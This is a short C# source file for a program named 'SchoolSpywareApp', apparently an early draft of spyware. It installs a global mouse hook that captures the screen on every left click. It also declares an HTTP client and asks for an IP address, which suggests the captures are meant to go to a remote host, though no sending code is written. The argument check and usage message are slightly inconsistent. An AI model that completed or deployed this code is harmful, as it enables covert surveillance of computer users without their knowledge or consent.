using SchoolLibrary;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Gma.System.MouseKeyHook;
using System.Drawing;
using System.Net.Http;

namespace SchoolSpywareApp
{
    internal class Program
    {
        HttpClient client = new HttpClient();

        static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                Console.WriteLine("Usage: {0} <ip>");
                return;
            }

            IKeyboardMouseEvents globalMouseHook = Hook.GlobalEvents();
            globalMouseHook.MouseDown += (sender, e) =>
            {
                if(e.Button == MouseButtons.Left)
                {
                    Bitmap bitmap = ImageLib.CaptureScreen();
                }
            };

            Application.Run();
        }
    }
}
